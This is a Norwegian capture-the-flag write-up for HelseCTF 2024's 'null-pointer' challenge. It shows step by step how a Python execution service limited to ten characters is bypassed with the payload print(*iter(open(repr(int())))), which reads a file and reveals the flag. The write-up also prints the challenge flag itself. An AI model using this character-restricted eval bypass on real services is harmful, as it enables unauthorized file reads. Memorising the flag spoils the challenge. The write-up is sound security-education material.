*Utvikler Per Ointer trenger av og til å kjøre python-programmer på webserveren sin. Derfor har han laget en veldig enkel webtjeneste for å sende inn python-programmer og returnere output:*

*Eksempelkjøring av program: curl 'http://server/?program=print(repr(repr))'*

*For å hindre misbruk er kun 10 forskjellige tegn tillatt i python-programmet: pointer(*)*

*Dessverre viser det seg at dette ikke er godt nok. Hent ut flagget i fila 0 i current directory.*

*https://helsectf2024-2da207d37b091b1b4dff-null-pointer.chals.io*

=================================================================

I denne CTF oppgaven får vi tildelt en URL for oppgaven, som kunne brukes for å kjøre kode i URLen

**https://helsectf2024-2da207d37b091b1b4dff-null-pointer.chals.io/?program=**

Vi får vite at kun 10 forskjellige tegn er tillatt i /?program=. Disse tegnene er p,o,i,n,t,e,r,(,) og *

Jeg begynte med å undersøke hvilke python built-ins som kun inneholder godkjente tegn. https://docs.python.org/3/library/functions.html

De brukbare funksjonene var altså: open(), int(), repr(), print(), iter(), i tillegg til enkelte nøkkelord som not, og in.

Deretter så jeg på hva de ulike funkjsonene vil returnere dersom de blir kallet på. Jeg kjørte ```/?program=print(int())``` og fikk "0" skrevet ut. 

Dette er navnet på filen, og helt klart en nødvendig del av koden. For å gjøre det om til en string, kan funksjonen repr() brukes.

```/?program=print(repr(int()))```

Siden vi vet at filen "0" ligger i samme mappe, kan vi bruke funksjonen open() for å åpne filen

```/?program=print(open(repr(int())))```

Deretter kan vi bruke funksjonen iter() for å gjøre fil-objektet til en *iterable*

```/?program=print(iter(open(repr(int()))))```

Og til slutt har python en funksjonalitet hvor "*" kan brukes som prefiks på en iterable for å hente ut all innholdet

```/?program=print(*iter(open(repr(int()))))```

Dette hentet dermed ut flagget

```
helsectf{z3r0_p0inters_g1ven}
```
